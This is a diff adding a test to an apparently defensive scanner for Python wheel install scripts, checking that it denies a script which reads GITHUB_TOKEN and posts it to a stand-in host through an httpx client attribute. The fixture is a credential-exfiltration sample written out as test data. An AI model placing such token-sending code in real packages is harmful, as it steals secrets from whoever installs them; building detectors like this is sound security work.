@@ -85,6 +85,32 @@ def test_wheel_install_script_credential_network_is_denied_without_risky_duplica
     )
 
 
+def test_wheel_install_script_class_client_attribute_credential_network_is_denied(
+    make_wheel,
+) -> None:
+    artifact = make_wheel(
+        {
+            "demo-1.0.0.data/scripts/send": (
+                "#!/usr/bin/env python3\n"
+                "import httpx\n"
+                "import os\n"
+                "class Api:\n"
+                "    def __init__(self):\n"
+                "        self.client = httpx.Client()\n"
+                "    def send(self):\n"
+                "        token = os.getenv('GITHUB_TOKEN')\n"
+                "        self.client.post('https://example.test', data=token)\n"
+                "Api().send()\n"
+            )
+        }
+    )
+    findings = scan_install_surface(str(artifact))
+    flows = [item for item in findings if item.rule == "wheel_install_script_credential_network"]
+    assert len(flows) == 1
+    assert flows[0].action == "DENY"
+    assert flows[0].sink == "httpx.Client.post"
+
+
 def test_wheel_install_script_file_credential_network_is_denied(make_wheel) -> None:
     artifact = make_wheel(
         {
